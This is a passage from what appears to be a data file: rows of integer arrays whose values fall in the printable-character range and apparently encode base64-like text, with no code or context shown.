  [117, 99, 121, 73, 101, 100, 110, 78, 87, 71, 106, 90, 47, 73, 118, 89, 71, 71, 110, 78, 67, 112, 109, 112, 113, 74, 107, 99, 67, 75, 103, 89, 98, 71, 104],
  [73, 50, 71, 106, 53, 121, 65, 119, 100, 80, 105, 106, 111, 101, 97, 119, 73, 83, 78, 110, 77, 105, 66, 49, 100, 106, 84, 103, 100, 83, 75, 103, 89, 98, 71],
  [104, 73, 50, 71, 106, 53, 121, 65, 48, 52, 72, 68, 119, 56, 71, 72, 110, 90, 121, 122, 103, 98, 88, 86, 105, 111, 71, 71, 120, 111, 117, 65, 105, 90, 113],
  [114, 104, 52, 121, 78, 113, 90, 122, 65, 103, 99, 72, 79, 50, 74, 67, 79, 106, 116, 80, 105, 109, 111, 50, 99, 110, 90, 113, 71, 121, 73, 101, 100, 110, 78],
  [80, 105, 108, 89, 117, 74, 110, 73, 117, 65, 119, 73, 51, 66, 107, 43, 75, 97, 106, 90, 121, 100, 109, 111, 98, 73, 104, 112, 50, 69, 104, 78, 80, 105, 108],
  [101, 75, 86, 52, 111, 54, 100, 104, 111, 117, 99, 103, 89, 101, 71, 121, 73, 113, 82, 110, 73, 50, 98, 118, 73, 101, 57, 110, 73, 55, 81, 119, 73, 113, 82],
  [110, 73, 50, 98, 119, 90, 80, 105, 110, 74, 113, 82, 107, 43, 75, 97, 106, 90, 121, 100, 109, 111, 98, 73, 104, 111, 50, 102, 121, 76, 121, 78, 107, 74, 121],
  [115, 106, 89, 117, 72, 106, 73, 50, 97, 119, 77, 43, 100, 110, 73, 55, 70, 48, 77, 47, 69, 107, 52, 54, 74, 110, 73, 109, 69, 48, 111, 54, 74, 104, 74],
  [117, 78, 108, 99, 72, 71, 106, 73, 50, 76, 104, 52, 121, 78, 119, 73, 113, 82, 110, 73, 50, 98, 119, 100, 80, 105, 108, 89, 117, 74, 110, 73, 117, 65, 119],
  [73, 51, 66, 107, 43, 75, 69, 106, 90, 122, 73, 109, 57, 88, 80, 122, 57, 80, 105, 106, 111, 101, 97, 119, 73, 83, 78, 110, 77, 105, 66, 49, 100, 106, 84],
  [103, 100, 83, 75, 107, 90, 121, 78, 109, 56, 97, 69, 106, 89, 97, 80, 110, 73, 68, 84, 103, 99, 80, 68, 119, 90, 118, 68, 49, 98, 117, 99, 109, 111, 71],
  [71, 106, 56, 97, 79, 109, 111, 101, 70, 113, 52, 67, 74, 109, 113, 117, 72, 106, 73, 51, 65, 105, 112, 71, 99, 106, 90, 117, 122, 103, 98, 88, 66, 48, 43],
  [75, 97, 106, 90, 121, 100, 109, 111, 98, 73, 109, 57, 80, 105, 108, 101, 75, 86, 52, 111, 54, 100, 104, 111, 117, 99, 103, 89, 101, 71, 121, 73, 117, 72, 104],
  [111, 117, 74, 110, 75, 113, 82, 110, 73, 50, 98, 119, 73, 110, 69, 105, 115, 71, 84, 52, 111, 117, 72, 104, 112, 117, 99, 121, 73, 101, 100, 110, 78, 87, 71],
  [106, 90, 47, 73, 118, 89, 71, 71, 110, 78, 67, 112, 109, 112, 113, 74, 107, 99, 67, 74, 120, 111, 83, 78, 104, 111, 43, 99, 103, 77, 79, 75, 120, 111, 83],
  [78, 104, 111, 43, 99, 103, 77, 72, 84, 52, 111, 101, 100, 110, 77, 97, 98, 106, 90, 122, 65, 105, 99, 84, 89, 119, 100, 80, 105, 104, 53, 50, 99, 120, 112],
  [117, 78, 110, 77, 67, 75, 120, 73, 110, 71, 104, 73, 50, 71, 106, 53, 121, 65, 119, 100, 80, 105, 109, 111, 50, 99, 110, 90, 113, 71, 121, 73, 101, 100, 110],
  [78, 80, 105, 108, 101, 75, 74, 109, 53, 71, 71, 105, 56, 105, 79, 110, 89, 97, 76, 110, 73, 71, 72, 104, 115, 105, 98, 103, 73, 110, 97, 51, 100, 54, 113],
  [107, 90, 121, 78, 109, 56, 67, 75, 107, 90, 121, 78, 109, 56, 71, 84, 52, 112, 121, 97, 107, 90, 80, 105, 103, 89, 55, 65, 110, 74, 71, 89, 106, 89, 101],
  [79, 121, 73, 117, 97, 107, 90, 105, 99, 104, 57, 88, 86, 49, 99, 43, 100, 104, 111, 121, 78, 106, 111, 71, 71, 106, 89, 122, 80, 108, 74, 84, 74, 105, 53],
  [113, 82, 109, 74, 121, 72, 120, 112, 117, 100, 105, 112, 121, 69, 106, 90, 83, 85, 121, 89, 117, 97, 107, 90, 105, 99, 104, 56, 97, 98, 110, 89, 113, 99, 104],
  [73, 51, 71, 106, 73, 71, 80, 106, 90, 117, 99, 119, 90, 113, 78, 110, 74, 50, 97, 104, 115, 105, 71, 110, 89, 83, 69, 48, 43, 75, 76, 104, 52, 97, 98],
  [110, 77, 105, 77, 103, 89, 43, 78, 109, 53, 122, 86, 105, 90, 43, 74, 103, 90, 122, 73, 105, 53, 113, 82, 109, 74, 121, 72, 120, 112, 117, 100, 105, 112, 121],
  [69, 106, 99, 97, 77, 103, 89, 43, 78, 109, 53, 122, 65, 122, 55, 117, 103, 113, 99, 88, 97, 51, 100, 55, 80, 120, 73, 113, 82, 110, 73, 50, 98, 120, 111],
  [113, 100, 106, 111, 54, 78, 109, 116, 101, 75, 107, 90, 121, 78, 109, 56, 97, 75, 110, 89, 54, 79, 106, 90, 114, 83, 105, 112, 71, 99, 106, 90, 118, 66, 48],
  [43, 75, 97, 106, 90, 121, 100, 109, 111, 98, 73, 104, 111, 50, 102, 121, 76, 50, 66, 104, 112, 122, 81, 113, 90, 113, 97, 105, 90, 72, 65, 106, 73, 71, 80],
  [106, 90, 117, 99, 119, 100, 80, 105, 108, 89, 117, 74, 110, 73, 117, 65, 119, 73, 51, 66, 107, 43, 75, 97, 106, 90, 121, 100, 109, 111, 98, 73, 104, 112, 50],
  [69, 104, 78, 80, 105, 108, 101, 75, 86, 52, 111, 54, 100, 104, 111, 117, 99, 103, 89, 101, 71, 121, 74, 113, 76, 51, 77, 67, 68, 106, 90, 71, 113, 107, 90],
  [121, 78, 109, 56, 83, 77, 105, 90, 121, 74, 113, 112, 71, 99, 106, 90, 118, 66, 107, 43, 75, 76, 104, 52, 97, 98, 110, 77, 105, 98, 49, 89, 97, 78, 110],
  [56, 105, 57, 103, 89, 97, 99, 48, 75, 109, 97, 109, 111, 109, 82, 119, 78, 114, 100, 51, 115, 72, 84, 52, 111, 54, 72, 109, 115, 67, 69, 106, 90, 122, 73],
  [103, 100, 88, 89, 48, 52, 72, 85, 50, 116, 51, 101, 48, 52, 72, 68, 119, 56, 71, 98, 115, 52, 71, 49, 49, 89, 72, 84, 52, 111, 83, 78, 110, 77, 105],
  [67, 49, 100, 106, 84, 52, 111, 54, 72, 109, 115, 67, 69, 106, 90, 122, 73, 103, 100, 88, 89, 48, 52, 72, 85, 50, 116, 51, 101, 48, 52, 72, 68, 119, 56],
  [71, 84, 52, 111, 76, 86, 119, 73, 76, 68, 109, 55, 79, 66, 116, 99, 79, 68, 106, 90, 71, 113, 107, 90, 121, 78, 109, 55, 79, 66, 122, 89, 79, 78, 107],
  [97, 113, 82, 110, 73, 50, 98, 120, 111, 83, 78, 104, 111, 43, 99, 103, 76, 88, 66, 122, 116, 114, 100, 51, 100, 80, 105, 105, 52, 101, 71, 109, 53, 122, 73],
  [110, 73, 87, 89, 49, 90, 117, 122, 103, 98, 88, 84, 52, 112, 117, 122, 103, 98, 88, 86, 109, 55, 79, 67, 116, 100, 80, 105, 109, 55, 79, 67, 116, 100, 87],
  [99, 104, 90, 106, 84, 52, 112, 88, 105, 104, 73, 50, 99, 121, 73, 72, 86, 50, 78, 80, 105, 103, 116, 88, 89, 48, 43, 75, 76, 104, 52, 97, 98, 110, 77],
  [105, 72, 110, 90, 122, 86, 104, 111, 50, 102, 121, 76, 50, 66, 104, 112, 122, 81, 113, 90, 113, 97, 105, 90, 72, 65, 106, 73, 109, 99, 105, 97, 113, 82, 110],
  [73, 50, 98, 120, 111, 83, 78, 104, 111, 43, 99, 103, 77, 72, 84, 52, 111, 54, 72, 109, 115, 67, 69, 106, 90, 122, 73, 104, 116, 88, 89, 48, 52, 98, 85],
  [106, 73, 109, 99, 105, 97, 113, 82, 110, 73, 50, 98, 120, 111, 83, 78, 104, 111, 43, 99, 103, 78, 79, 71, 119, 56, 80, 66, 107, 43, 75, 66, 49, 99, 67],
  [66, 119, 57, 110, 66, 122, 116, 114, 100, 51, 100, 80, 105, 103, 116, 88, 65, 103, 115, 79, 98, 115, 52, 71, 49, 119, 99, 55, 97, 51, 100, 51, 84, 52, 111],
  [117, 72, 104, 112, 117, 99, 121, 74, 121, 70, 109, 78, 87, 98, 115, 52, 71, 49, 48, 43, 75, 98, 115, 52, 71, 49, 49, 90, 117, 122, 103, 114, 88, 84, 52],
  [112, 117, 122, 103, 114, 88, 86, 110, 73, 87, 89, 48, 43, 75, 76, 104, 52, 97, 98, 110, 77, 105, 68, 49, 90, 117, 122, 119, 74, 117, 122, 103, 98, 88, 68],
  [109, 55, 79, 67, 116, 99, 72, 79, 50, 116, 51, 100, 116, 100, 80, 105, 104, 53, 50, 99, 115, 52, 97, 49, 49, 89, 121, 74, 110, 73, 109, 113, 107, 90, 121],
  [78, 109, 55, 79, 71, 116, 98, 97, 68, 48, 43, 75, 86, 52, 112, 113, 78, 110, 74, 50, 97, 104, 115, 105, 72, 110, 90, 122, 84, 52, 112, 88, 105, 106, 112],
  [50, 71, 105, 53, 121, 66, 104, 52, 98, 73, 105, 112, 50, 66, 104, 73, 121, 112, 109, 73, 71, 57, 109, 111, 84, 65, 109, 73, 109, 97, 105, 89, 87, 98, 119],
  [90, 80, 105, 103, 89, 55, 65, 121, 89, 109, 89, 103, 97, 113, 74, 109, 52, 51, 66, 109, 111, 50, 99, 110, 90, 113, 71, 122, 56, 47, 84, 52, 112, 121, 97],
  [107, 90, 80, 105, 105, 52, 101, 71, 109, 53, 122, 73, 109, 90, 118, 86, 104, 111, 50, 102, 121, 76, 50, 54, 112, 76, 117, 78, 105, 90, 113, 76, 103, 76, 105],
  [74, 109, 111, 109, 70, 109, 56, 67, 89, 105, 90, 113, 74, 104, 90, 117, 85, 108, 74, 79, 86, 119, 99, 97, 99, 104, 55, 117, 99, 109, 111, 71, 71, 106, 56],
  [68, 66, 48, 43, 75, 76, 104, 52, 97, 98, 110, 77, 105, 68, 106, 90, 72, 86, 103, 73, 50, 81, 118, 73, 101, 113, 107, 90, 121, 78, 109, 56, 67, 112, 117],
  [75, 71, 51, 117, 100, 113, 51, 111, 54, 50, 120, 116, 54, 67, 116, 115, 77, 72, 84, 52, 111, 71, 79, 119, 73, 79, 78, 107, 99, 55, 79, 110, 74, 71, 89],
  [106, 89, 101, 79, 121, 76, 50, 66, 104, 112, 122, 81, 113, 90, 113, 97, 105, 90, 72, 74, 49, 100, 88, 80, 110, 89, 97, 77, 106, 89, 54, 66, 104, 111, 50],
  [77, 122, 56, 71, 84, 52, 111, 117, 72, 104, 112, 117, 99, 121, 73, 97, 72, 104, 111, 117, 78, 49, 89, 97, 78, 110, 56, 105, 57, 103, 89, 97, 99, 48, 75],
  [109, 97, 109, 111, 109, 82, 119, 78, 68, 66, 48, 43, 75, 66, 106, 115, 67, 99, 107, 90, 105, 78, 104, 52, 55, 73, 105, 53, 113, 82, 109, 74, 121, 72, 121],
  [100, 88, 86, 122, 53, 50, 71, 106, 73, 50, 79, 103, 89, 97, 78, 106, 77, 47, 79, 122, 111, 117, 97, 107, 90, 105, 99, 104, 56, 97, 80, 106, 90, 121, 54],
  [105, 89, 97, 77, 104, 52, 87, 43, 105, 89, 83, 100, 106, 90, 118, 66, 107, 43, 75, 76, 109, 112, 71, 89, 110, 73, 102, 71, 106, 52, 50, 99, 117, 111, 109],
  [71, 106, 73, 101, 70, 118, 111, 109, 69, 110, 89, 50, 98, 119, 73, 97, 72, 104, 111, 117, 78, 119, 100, 80, 105, 108, 89, 50, 69, 109, 52, 50, 84, 52, 111],
  [54, 72, 109, 115, 67, 69, 106, 90, 122, 73, 103, 100, 88, 89, 48, 52, 72, 85, 104, 111, 101, 71, 105, 52, 51, 71, 104, 73, 50, 71, 106, 53, 121, 65, 48],
  [52, 72, 68, 119, 56, 71, 71, 104, 52, 97, 76, 106, 98, 79, 66, 116, 100, 88, 65, 112, 89, 109, 99, 103, 77, 97, 97, 105, 89, 97, 77, 104, 52, 88, 65],
  [119, 99, 76, 97, 51, 100, 55, 66, 122, 116, 114, 100, 51, 100, 80, 105, 108, 101, 75, 76, 104, 52, 97, 98, 110, 77, 105, 78, 104, 111, 118, 86, 119, 74, 121],
  [82, 109, 73, 50, 72, 106, 115, 105, 56, 106, 90, 67, 99, 114, 89, 97, 76, 104, 52, 121, 78, 109, 115, 110, 86, 49, 99, 43, 100, 104, 111, 121, 78, 106, 111],
  [71, 71, 106, 89, 122, 80, 119, 100, 101, 71, 106, 90, 47, 73, 118, 73, 50, 81, 110, 75, 50, 71, 105, 52, 101, 77, 106, 90, 114, 65, 119, 100, 75, 71, 110],
  [89, 83, 69, 48, 43, 75, 76, 104, 52, 97, 98, 110, 77, 105, 89, 104, 73, 109, 66, 104, 113, 113, 82, 110, 73, 50, 98, 49, 89, 50, 71, 105, 57, 101, 78],
  [104, 111, 118, 71, 106, 89, 97, 76, 104, 52, 121, 78, 119, 74, 109, 98, 119, 100, 76, 65, 106, 112, 50, 71, 105, 53, 121, 66, 104, 52, 98, 65, 119, 90, 80],
  [105, 105, 52, 101, 71, 109, 53, 122, 73, 105, 90, 113, 97, 49, 89, 97, 78, 110, 56, 105, 57, 103, 89, 97, 99, 48, 75, 109, 97, 109, 111, 109, 82, 119, 74],
  [109, 98, 120, 111, 83, 78, 104, 111, 43, 99, 103, 77, 72, 84, 52, 111, 54, 72, 109, 115, 67, 69, 106, 90, 122, 73, 103, 100, 88, 89, 48, 52, 72, 85, 109],
  [90, 118, 71, 104, 73, 50, 71, 106, 53, 121, 65, 48, 52, 72, 68, 119, 56, 71, 74, 109, 112, 113, 122, 103, 98, 88, 86, 109, 90, 118, 71, 105, 52, 67, 74],
  [109, 113, 117, 72, 106, 73, 50, 112, 110, 77, 67, 66, 119, 99, 55, 97, 51, 100, 51, 84, 52, 112, 113, 78, 110, 74, 50, 97, 104, 115, 105, 74, 109, 112, 114],
  [84, 52, 112, 88, 66, 119, 77, 72, 84, 52, 111, 117, 72, 104, 112, 117, 99, 121, 73, 79, 78, 107, 97, 87, 74, 110, 78, 87, 71, 106, 90, 47, 73, 118, 89],
  [71, 71, 110, 78, 67, 112, 109, 112, 113, 74, 107, 99, 67, 68, 106, 90, 72, 71, 104, 73, 50, 71, 106, 53, 121, 65, 119, 52, 97, 72, 104, 111, 117, 78, 120],
  [111, 83, 78, 104, 111, 43, 99, 103, 77, 72, 84, 52, 111, 79, 78, 107, 97, 87, 74, 110, 77, 97, 98, 106, 90, 122, 65, 103, 52, 50, 82, 120, 78, 106, 66],
  [48, 43, 75, 68, 106, 90, 71, 108, 105, 90, 122, 71, 109, 52, 50, 99, 119, 73, 97, 72, 104, 111, 117, 78, 120, 73, 79, 78, 107, 99, 97, 69, 106, 89, 97],
  [80, 110, 73, 68, 66, 48, 43, 75, 76, 104, 52, 97, 98, 110, 77, 105, 76, 103, 90, 105, 65, 106, 90, 113, 113, 107, 90, 121, 78, 109, 57, 87, 97, 105, 57],
  [122, 65, 103, 52, 50, 82, 112, 89, 109, 99, 120, 74, 105, 69, 105, 89, 71, 71, 113, 112, 71, 99, 106, 90, 118, 66, 48, 43, 75, 76, 104, 52, 97, 98, 110],
  [77, 105, 89, 105, 90, 71, 69, 104, 52, 109, 77, 49, 89, 97, 78, 110, 56, 105, 57, 103, 89, 97, 99, 48, 75, 109, 97, 109, 111, 109, 82, 119, 73, 97, 72],
  [104, 111, 117, 78, 120, 111, 83, 78, 104, 111, 43, 99, 103, 77, 79, 76, 103, 90, 105, 65, 106, 90, 113, 113, 107, 90, 121, 78, 109, 56, 97, 69, 106, 89, 97],
  [80, 110, 73, 68, 66, 48, 43, 75, 89, 105, 90, 71, 69, 104, 52, 109, 77, 120, 112, 117, 78, 110, 77, 67, 71, 104, 52, 97, 76, 106, 99, 84, 89, 119, 100],
  [80, 105, 109, 73, 109, 82, 104, 73, 101, 74, 106, 77, 97, 98, 106, 90, 122, 65, 105, 52, 71, 89, 103, 73, 50, 97, 113, 112, 71, 99, 106, 90, 118, 69, 104],
  [111, 101, 71, 105, 52, 51, 71, 104, 73, 50, 71, 106, 53, 121, 65, 119, 100, 80, 105, 105, 52, 101, 71, 109, 53, 122, 73, 109, 73, 109, 76, 103, 52, 50, 77],
  [49, 89, 113, 82, 110, 73, 50, 98, 118, 73, 101, 113, 51, 116, 121, 57, 109, 111, 84, 65, 109, 73, 109, 82, 104, 73, 101, 74, 106, 77, 72, 84, 52, 111, 71],
  [79, 119, 74, 105, 74, 105, 52, 79, 78, 106, 77, 71, 84, 52, 112, 113, 78, 110, 74, 50, 97, 104, 115, 105, 74, 109, 73, 71, 113, 105, 90, 117, 78, 119, 56],
  [47, 72, 105, 90, 105, 66, 120, 52, 71, 71, 106, 73, 50, 81, 120, 112, 105, 65, 109, 78, 101, 90, 49, 99, 47, 68, 109, 73, 109, 76, 103, 52, 50, 77, 48],
  [43, 75, 86, 52, 112, 88, 105, 109, 111, 50, 99, 110, 90, 113, 71, 122, 56, 47, 84, 52, 112, 87, 76, 105, 90, 121, 76, 103, 77, 67, 78, 119, 90, 80, 105],
  [109, 111, 50, 99, 110, 90, 113, 71, 122, 56, 47, 84, 52, 112, 88, 105, 108, 101, 75, 74, 109, 53, 71, 71, 105, 56, 105, 79, 110, 89, 97, 76, 110, 73, 71],
  [72, 104, 115, 105, 77, 106, 89, 117, 97, 107, 90, 105, 99, 113, 90, 105, 66, 114, 89, 97, 101, 106, 89, 83, 72, 109, 73, 51, 65, 104, 52, 113, 67, 120, 74],
  [117, 76, 104, 53, 105, 78, 119, 90, 80, 105, 110, 74, 113, 82, 107, 43, 75, 66, 106, 115, 68, 74, 104, 52, 113, 67, 108, 74, 83, 99, 107, 90, 105, 78, 104],
  [52, 55, 73, 104, 52, 113, 67, 121, 100, 88, 86, 122, 52, 101, 75, 103, 111, 50, 76, 110, 77, 47, 66, 109, 111, 50, 99, 110, 90, 113, 71, 121, 73, 101, 75],
  [103, 116, 80, 105, 103, 89, 55, 65, 110, 74, 71, 89, 106, 89, 101, 79, 121, 73, 101, 75, 103, 115, 97, 90, 121, 100, 88, 86, 122, 53, 117, 99, 109, 111, 71],
  [71, 106, 56, 43, 85, 108, 77, 109, 72, 105, 111, 76, 71, 109, 99, 71, 97, 106, 90, 121, 100, 109, 111, 98, 73, 104, 52, 113, 67, 48, 43, 75, 76, 104, 52],
  [97, 98, 110, 77, 105, 98, 105, 89, 54, 78, 117, 52, 117, 72, 109, 73, 51, 86, 119, 74, 121, 82, 109, 73, 50, 72, 106, 115, 105, 98, 105, 52, 101, 89, 106],
  [100, 88, 86, 49, 99, 43, 98, 110, 74, 113, 66, 104, 111, 47, 80, 122, 115, 55, 72, 116, 114, 79, 74, 120, 90, 76, 89, 120, 100, 71, 51, 116, 90, 80, 90],
  [120, 78, 110, 101, 108, 99, 122, 72, 103, 99, 97, 99, 106, 90, 117, 99, 119, 74, 117, 76, 104, 53, 105, 78, 119, 99, 72, 88, 109, 52, 117, 72, 109, 73, 51],
  [83, 122, 52, 117, 79, 106, 56, 47, 84, 52, 111, 117, 72, 104, 112, 117, 99, 121, 73, 113, 74, 109, 52, 50, 106, 106, 90, 72, 86, 103, 73, 50, 81, 118, 73],
  [101, 113, 107, 90, 121, 78, 109, 56, 67, 112, 117, 75, 71, 51, 117, 100, 113, 51, 111, 54, 50, 120, 116, 54, 67, 116, 115, 77, 72, 84, 52, 111, 71, 79, 119],
  [77, 109, 75, 105, 90, 117, 78, 111, 52, 50, 82, 119, 90, 113, 78, 110, 74, 50, 97, 104, 115, 105, 72, 105, 111, 76, 84, 52, 111, 71, 79, 119, 73, 101, 75],
  [103, 115, 97, 78, 104, 111, 118, 86, 49, 100, 88, 80, 106, 52, 117, 70, 50, 99, 47, 66, 107, 43, 75, 99, 109, 112, 71, 84, 52, 111, 117, 72, 104, 112, 117],
  [99, 121, 74, 105, 74, 105, 52, 79, 78, 106, 78, 87, 75, 51, 116, 121, 100, 109, 111, 83, 56, 104, 54, 113, 82, 110, 73, 50, 98, 119, 73, 101, 75, 103, 115],
  [97, 90, 119, 100, 80, 105, 103, 89, 55, 65, 121, 90, 105, 74, 105, 52, 79, 78, 106, 74, 83, 85, 109, 73, 109, 76, 103, 52, 50, 77, 120, 111, 83, 78, 104],
  [111, 43, 99, 103, 78, 84, 65, 50, 100, 114, 68, 50, 100, 55, 68, 50, 99, 72, 66, 110, 73, 67, 97, 104, 53, 47, 73, 104, 111, 50, 102, 121, 75, 50, 97],
  [109, 111, 101, 97, 119, 77, 43, 80, 105, 52, 87, 51, 109, 73, 109, 76, 103, 52, 50, 77, 122, 56, 72, 84, 52, 111, 117, 72, 104, 112, 117, 99, 121, 73, 71],
  [101, 49, 90, 105, 74, 105, 52, 79, 78, 106, 77, 97, 98, 104, 73, 71, 76, 106, 99, 68, 89, 120, 78, 110, 97, 119, 100, 80, 105, 105, 52, 101, 71, 109, 53],
  [122, 73, 105, 52, 71, 89, 103, 73, 50, 97, 118, 52, 71, 99, 103, 76, 121, 74, 106, 57, 87, 89, 105, 89, 117, 68, 106, 89, 122, 71, 109, 52, 83, 66, 105],
  [52, 51, 65, 50, 100, 114, 66, 48, 43, 75, 76, 104, 52, 97, 98, 110, 77, 105, 80, 105, 52, 87, 107, 105, 89, 113, 78, 104, 78, 87, 98, 105, 89, 54, 78],
  [117, 52, 117, 72, 109, 73, 51, 68, 122, 53, 83, 80, 105, 52, 88, 90, 122, 57, 80, 105, 105, 52, 101, 71, 109, 53, 122, 73, 104, 73, 109, 75, 106, 89, 84],
  [86, 119, 74, 121, 82, 109, 73, 50, 72, 106, 115, 105, 56, 106, 90, 67, 99, 114, 89, 97, 76, 104, 52, 121, 78, 109, 115, 110, 86, 49, 99, 43, 100, 104, 111],
  [121, 78, 106, 111, 71, 71, 106, 89, 122, 80, 119, 100, 101, 71, 106, 90, 47, 73, 118, 73, 50, 81, 110, 75, 50, 71, 105, 52, 101, 77, 106, 90, 114, 65, 119],
  [99, 97, 78, 104, 111, 117, 72, 106, 73, 51, 65, 106, 52, 117, 70, 112, 73, 109, 75, 106, 89, 84, 66, 48, 115, 67, 79, 110, 89, 97, 76, 110, 73, 71, 72],
  [104, 115, 68, 66, 107, 43, 75, 76, 104, 52, 97, 98, 110, 77, 105, 98, 49, 89, 43, 76, 104, 97, 83, 74, 105, 111, 50, 69, 48, 43, 75, 76, 104, 52, 97],
  [98, 110, 77, 105, 74, 109, 112, 114, 86, 104, 111, 50, 102, 121, 76, 50, 66, 104, 112, 122, 81, 113, 90, 113, 97, 105, 90, 72, 65, 109, 56, 97, 69, 106, 89],
  [97, 80, 110, 73, 68, 66, 48, 43, 75, 79, 104, 53, 114, 65, 104, 73, 50, 99, 121, 73, 72, 86, 50, 78, 79, 66, 49, 74, 118, 71, 104, 73, 50, 71, 106],
  [53, 121, 65, 48, 52, 72, 68, 119, 56, 71, 74, 109, 112, 113, 122, 103, 98, 88, 86, 109, 56, 97, 76, 103, 73, 109, 97, 113, 52, 101, 77, 106, 97, 109, 99],
  [119, 73, 72, 66, 122, 116, 114, 100, 51, 100, 80, 105, 109, 111, 50, 99, 110, 90, 113, 71, 121, 73, 109, 97, 109, 116, 80, 105, 108, 99, 72, 65, 119, 100, 80],
  [105, 105, 52, 101, 71, 109, 53, 122, 73, 103, 52, 50, 82, 113, 112, 71, 99, 106, 90, 118, 86, 105, 90, 43, 74, 103, 90, 122, 73, 109, 52, 67, 74, 50, 116],
  [51, 101, 113, 112, 71, 99, 106, 90, 118, 65, 105, 52, 101, 71, 105, 52, 109, 99, 113, 112, 71, 99, 106, 90, 118, 65, 105, 111, 109, 98, 106, 97, 79, 78, 107],
  [99, 83, 69, 105, 89, 113, 78, 104, 77, 72, 66, 48, 43, 75, 66, 106, 115, 68, 74, 103, 52, 50, 82, 113, 112, 71, 99, 106, 90, 118, 66, 110, 73, 67, 97],
  [104, 53, 47, 73, 104, 111, 50, 102, 121, 75, 50, 97, 109, 111, 101, 97, 119, 77, 43, 80, 105, 52, 87, 51, 103, 52, 50, 82, 122, 56, 72, 84, 52, 111, 71],
  [79, 119, 74, 121, 82, 109, 73, 50, 72, 106, 115, 105, 76, 109, 112, 71, 89, 110, 73, 102, 86, 49, 100, 88, 80, 110, 89, 97, 77, 106, 89, 54, 66, 104, 111],
  [50, 77, 122, 53, 83, 85, 121, 89, 117, 97, 107, 90, 105, 99, 104, 56, 97, 98, 110, 89, 113, 99, 104, 73, 50, 85, 108, 77, 109, 76, 109, 112, 71, 89, 110],
  [73, 102, 71, 109, 53, 50, 75, 110, 73, 83, 78, 120, 111, 71, 70, 109, 73, 101, 97, 110, 75, 79, 78, 107, 99, 71, 99, 103, 74, 113, 72, 110, 56, 105, 71],
  [106, 90, 47, 73, 114, 90, 113, 97, 104, 53, 114, 65, 122, 52, 43, 76, 104, 98, 101, 98, 110, 89, 113, 99, 104, 73, 51, 80, 119, 100, 80, 105, 105, 52, 101],
  [71, 109, 53, 122, 73, 105, 53, 113, 82, 109, 74, 121, 72, 111, 52, 50, 82, 49, 89, 109, 102, 105, 89, 71, 99, 121, 73, 117, 97, 107, 90, 105, 99, 104, 56],
  [97, 98, 110, 89, 113, 99, 104, 73, 51, 71, 103, 89, 87, 89, 104, 53, 113, 99, 111, 52, 50, 82, 119, 77, 43, 97, 105, 90, 47, 80, 120, 73, 79, 78, 107],
  [97, 113, 82, 110, 73, 50, 98, 120, 74, 79, 71, 105, 89, 87, 78, 48, 115, 43, 112, 114, 98, 118, 70, 114, 54, 117, 108, 122, 53, 88, 69, 106, 111, 109, 69],
  [109, 52, 51, 69, 115, 56, 43, 77, 106, 89, 117, 97, 107, 90, 105, 99, 122, 55, 88, 66, 48, 43, 75, 76, 104, 52, 97, 98, 110, 77, 105, 89, 104, 73, 109],
  [66, 104, 113, 113, 100, 106, 116, 87, 74, 110, 52, 109, 66, 110, 77, 105, 76, 109, 112, 71, 89, 110, 73, 102, 71, 109, 53, 50, 75, 110, 73, 83, 78, 120, 111],
  [121, 78, 105, 53, 113, 82, 109, 74, 122, 65, 107, 52, 97, 74, 104, 89, 51, 83, 122, 54, 109, 116, 117, 56, 87, 118, 113, 54, 88, 80, 120, 73, 71, 101, 48],
  [111, 71, 101, 120, 74, 121, 74, 106, 54, 83, 78, 104, 111, 43, 99, 103, 78, 76, 90, 50, 116, 67, 86, 120, 73, 117, 97, 107, 90, 105, 99, 104, 54, 79, 78],
  [107, 99, 83, 76, 103, 90, 105, 65, 106, 90, 113, 47, 103, 90, 121, 65, 118, 73, 109, 80, 119, 100, 80, 105, 105, 52, 101, 71, 109, 53, 122, 73, 103, 112, 117],
  [72, 104, 116, 87, 75, 107, 90, 121, 78, 109, 55, 121, 72, 118, 90, 121, 79, 48, 77, 67, 71, 106, 90, 47, 73, 118, 89, 71, 71, 110, 78, 67, 112, 109, 112],
  [113, 74, 107, 99, 67, 89, 104, 73, 109, 66, 104, 113, 113, 100, 106, 115, 72, 66, 48, 43, 75, 97, 106, 90, 121, 100, 109, 111, 98, 73, 111, 114, 117, 110, 112],
  [115, 97, 89, 105, 90, 113, 98, 106, 99, 67, 67, 109, 52, 101, 71, 119, 100, 80, 105, 108, 89, 117, 74, 110, 73, 117, 65, 119, 73, 51, 66, 107, 43, 75, 66],
  [106, 115, 67, 99, 107, 90, 105, 78, 104, 52, 55, 73, 104, 52, 113, 67, 120, 112, 110, 97, 49, 100, 88, 86, 122, 53, 117, 99, 109, 111, 71, 71, 106, 56, 47],
  [79, 122, 111, 101, 75, 103, 115, 97, 90, 50, 115, 71, 84, 52, 111, 117, 72, 104, 112, 117, 99, 121, 74, 105, 74, 105, 52, 79, 78, 106, 78, 114, 86, 105, 116],
  [55, 99, 110, 90, 113, 69, 118, 73, 101, 113, 107, 90, 121, 78, 109, 56, 67, 72, 105, 111, 76, 71, 109, 100, 114, 66, 48, 43, 75, 66, 106, 115, 67, 89, 105],
  [89, 117, 68, 106, 89, 122, 97, 122, 115, 54, 89, 105, 89, 117, 68, 106, 89, 122, 97, 120, 111, 83, 78, 104, 111, 43, 99, 103, 78, 98, 86, 48, 99, 71, 84],
  [52, 111, 117, 72, 104, 112, 117, 99, 121, 73, 97, 72, 104, 111, 117, 78, 49, 90, 105, 74, 105, 52, 79, 78, 106, 78, 114, 71, 109, 52, 83, 66, 105, 52, 51],
  [65, 50, 77, 84, 81, 119, 100, 80, 105, 105, 52, 101, 71, 109, 53, 122, 73, 105, 52, 71, 89, 103, 73, 50, 97, 50, 116, 87, 89, 105, 89, 117, 68, 106, 89],
  [122, 97, 120, 112, 117, 69, 103, 89, 117, 78, 119, 78, 68, 66, 48, 43, 75, 76, 104, 52, 97, 98, 110, 77, 105, 68, 106, 90, 71, 108, 105, 90, 122, 86, 104],
  [111, 50, 102, 121, 76, 50, 66, 104, 112, 122, 81, 113, 90, 113, 97, 105, 90, 72, 65, 105, 111, 109, 98, 106, 97, 79, 78, 107, 99, 97, 69, 106, 89, 97, 80],
  [110, 73, 68, 68, 104, 111, 101, 71, 105, 52, 51, 71, 104, 73, 50, 71, 106, 53, 121, 65, 119, 100, 80, 105, 103, 52, 50, 82, 112, 89, 109, 99, 120, 112, 117],
  [78, 110, 77, 67, 75, 105, 90, 117, 78, 111, 52, 50, 82, 120, 78, 106, 66, 48, 43, 75, 68, 106, 90, 71, 108, 105, 90, 122, 71, 109, 52, 50, 99, 119, 73],
